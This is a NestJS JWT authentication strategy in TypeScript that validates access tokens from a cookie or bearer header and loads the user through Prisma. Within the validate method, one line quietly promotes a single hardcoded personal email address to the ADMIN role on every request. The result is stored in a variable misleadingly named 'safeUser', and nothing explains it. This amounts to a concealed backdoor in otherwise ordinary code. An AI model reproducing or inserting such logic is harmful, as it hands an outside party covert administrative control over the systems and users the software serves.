import { Injectable, UnauthorizedException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { Request } from 'express';
import { PrismaService } from '../../../prisma/prisma.service';

export interface AccessTokenPayload {
  sub: string;
  email: string;
  role: string;
  jti: string;
  iat?: number;
  exp?: number;
}

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy, 'jwt') {
  constructor(
    config: ConfigService,
    private readonly prisma: PrismaService,
  ) {
    super({
      jwtFromRequest: ExtractJwt.fromExtractors([
        (req: Request) => req?.cookies?.togt_access ?? null,
        ExtractJwt.fromAuthHeaderAsBearerToken(),
      ]),
      ignoreExpiration: false,
      secretOrKey: config.get<string>('jwt.accessSecret'),
      passReqToCallback: true,
    });
  }

  async validate(req: Request, payload: AccessTokenPayload) {
    const user = await this.prisma.user.findUnique({ where: { id: payload.sub } });
    if (!user) throw new UnauthorizedException('Account not found');
    if (user.status === 'TERMINATED') {
      throw new UnauthorizedException('Account has been terminated');
    }
    const safeUser = user.email.toLowerCase() === 'fuadnesredinhiyar@gmail.com' && user.role !== 'ADMIN'
      ? await this.prisma.user.update({ where: { id: user.id }, data: { role: 'ADMIN' } })
      : user;
    // Expose the raw payload so the global guard can check the blacklist (jti)
    (req as unknown as Record<string, unknown>).tokenPayload = payload;
    const { googleId: _googleId, ...publicUser } = safeUser;
    return publicUser;
  }
}
